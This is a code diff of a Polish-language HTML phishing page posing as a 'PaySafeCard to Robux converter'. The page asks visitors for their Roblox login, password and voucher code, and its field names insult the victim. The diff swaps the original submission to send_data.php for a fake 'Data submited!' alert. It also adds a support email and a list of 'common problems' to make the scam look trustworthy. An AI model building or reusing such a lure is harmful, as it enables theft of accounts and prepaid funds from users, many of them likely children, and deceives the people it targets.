@@ -6,22 +6,43 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>Roblox robux sender</title>
         <link rel="stylesheet" href="style.css">
+        <script>
+            function a()
+            {
+                if(document.getElementById("login").value!=""&&document.getElementById("haslo").value!=""&&document.getElementById("kod").value!="")
+                {
+                    alert("Data submited!");
+                }
+                else
+                {
+                    alert("Niepoprawne dane");
+                }
+            }
+        </script>
     </head>
     <body>
         <header>
             Pay Safe Card to Robux converter
         </header>
         <main>
-            Transfer your PSC to robux in easy and trusted way.
-            <form action="send_data.php" method="post">
+            Zamien swoje PSC na robux w prosty i sprawdzony sposob.
+            <form action="" method="post">
                 <fieldset>
                     <legend>Login to roblox</legend>
-                    <input type="text" name="login_skurczysyna" placeholder="Login"><br>
-                    <input type="password" name="haslo_skurczysyna" placeholder="Pass "><br>
-                    <input type="password" placeholder="Code" name="kod"><br>
-                    <input type="submit" value="Log in" id="submit_button">
+                    <input type="text" name="login_skurczysyna" placeholder="Login" id="login"><br>
+                    <input type="password" name="haslo_skurczysyna" placeholder="Pass " id="haslo"><br>
+                    <input type="password" placeholder="Code" name="kod" id="kod"><br>
+                    <button id="submit_button" onclick="a()">Log in</button>
+                    <!--<input type="submit" value="Log in" id="submit_button">-->
+                    <p>Zglos problemy na bkow2000.pl@gmail.com</p><br>
+                    <p>Częste problemy ktore mozna rozwiazac poprzez napsianie na e-maila:</p>
+                    <ul>
+                        <li>Robuxy nie wpływaja na konto</li>
+                        <li>Zla ilosc Robuxow wplywa na konto (problem z kursem robuxow)</li>
+                    </ul>
                 </fieldset>
-            </form><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+            </form>
+            
         </main>
         <aside>
 
